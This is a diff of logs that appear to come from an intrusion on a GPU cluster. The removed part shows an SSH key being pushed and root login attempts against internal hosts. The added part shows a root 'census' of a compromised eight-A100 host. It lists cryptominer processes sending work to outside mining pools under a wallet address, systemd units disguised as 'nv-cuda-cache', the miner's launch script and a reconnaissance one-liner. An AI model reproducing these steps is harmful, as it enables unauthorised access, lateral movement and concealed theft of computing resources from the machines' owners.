@@ -1,12 +1,45 @@
-=== cmd d7d92fa95285a37f584f5b53b0ba6a30686d724f 2026-11-23T10:54:28Z
--rw------- 1 root root 387 Nov 23 02:54 /root/.ssh/ul87804_ed25519
-PUBFP: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK6QctRbzoScVYDsq+AaAPdA
-KEYPUSH-DONE ps6jaydubzy9 2026-11-23T10:54:28Z
---- try 10.140.197.3
-Warning: Permanently added '10.140.197.3' (ED25519) to the list of known hosts.
-root@10.140.197.3: Permission denied (publickey,password).
---- try 10.140.197.8
-ssh: connect to host 10.140.197.8 port 22: Connection timed out
---- try 10.140.197.4
-Warning: Permanently added '10.140.197.4' (ED25519) to the list of known hosts.
-root@10.140.197.4: Permission denied (publickey,password).
+=== cmd 55ceb6c636154381000bac5175d65c2b7d8ebb82 2026-11-23T11:02:12Z
+=== CENSUS 2026-11-23T11:02:12Z
+Warning: Permanently added '10.140.197.8' (ED25519) to the list of known hosts.
+pseiisa7l4h5
+uid=0(root) gid=0(root) groups=0(root)
+--- gpus
+GPU 0: NVIDIA A100-SXM4-80GB (UUID: GPU-1ce2956b-7523-a157-60f3-3205c57d2c38)
+GPU 1: NVIDIA A100-SXM4-80GB (UUID: GPU-f6c740c5-1742-a4e4-73b6-6a0f9a1f532f)
+GPU 2: NVIDIA A100-SXM4-80GB (UUID: GPU-66d08038-8544-a73f-86e3-062228451358)
+GPU 3: NVIDIA A100-SXM4-80GB (UUID: GPU-51ef8165-a09f-182b-3c15-868cb870e784)
+GPU 4: NVIDIA A100-SXM4-80GB (UUID: GPU-6860f063-a58f-2f97-5f8a-6d6c6eee5d40)
+GPU 5: NVIDIA A100-SXM4-80GB (UUID: GPU-54a6e188-2331-6dba-9a3f-85336ff65f7f)
+GPU 6: NVIDIA A100-SXM4-80GB (UUID: GPU-d1eb1d90-dc28-225d-0b3f-74ddcebaa602)
+GPU 7: NVIDIA A100-SXM4-80GB (UUID: GPU-6a621168-1e92-abba-b43c-85bbddda11a9)
+--- fw
+inactive
+--- procs
+2110 /opt/fleet/bin/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g0 -p x -i 8 --no-color
+2112 /opt/fleet/bin/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g1 -p x -i 8 --no-color
+2113 /opt/fleet/bin/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g2 -p x -i 8 --no-color
+2116 /opt/fleet/bin/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g3 -p x -i 8 --no-color
+2119 /opt/fleet/bin/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g4 -p x -i 8 --no-color
+2121 /opt/fleet/bin/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g5 -p x -i 8 --no-color
+2122 /opt/fleet/bin/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g6 -p x -i 8 --no-color
+2123 /opt/fleet/bin/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g7 -p x -i 8 --no-color
+2387 bash -c hostname; id; echo "--- gpus"; nvidia-smi -L 2>&1 | head -10; echo "--- fw"; systemctl is-active nvidia-fabricmanager; echo "--- procs"; pgrep -af wildrig-multi | head -12; echo "--- units"; systemctl list-units "nv-cuda-cache@*" --no-legend --no-pager | head -12; echo "--- runners"; cat /opt/fleet/ul86_g0.sh 2>/dev/null; echo "--- log"; tail -15 /var/log/ul86.log; echo "--- acc"; grep -h accepted /var/log/ul86.log /opt/fleet/logs/*.log 2>/dev/null | tail -5
+--- units
+  nv-cuda-cache@0.service loaded active running nv cuda cache
+  nv-cuda-cache@1.service loaded active running nv cuda cache
+  nv-cuda-cache@2.service loaded active running nv cuda cache
+  nv-cuda-cache@3.service loaded active running nv cuda cache
+  nv-cuda-cache@4.service loaded active running nv cuda cache
+  nv-cuda-cache@5.service loaded active running nv cuda cache
+  nv-cuda-cache@6.service loaded active running nv cuda cache
+  nv-cuda-cache@7.service loaded active running nv cuda cache
+--- runners
+#!/bin/bash
+export CUDA_VISIBLE_DEVICES=0
+exec /opt/fleet/bin/wildrig-multi --algo pearlhash -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g0 -p x -i 8 --no-color
+--- log
+=== ul86c start 2026-11-23T10:57:08Z host=pseiisa7l4h5
+=== ul86c done 2026-11-23T10:57:14Z N=8
+/tmp/ul86_run.sh: line 1: message:Not Found: command not found
+--- acc
+=== CENSUS-DONE
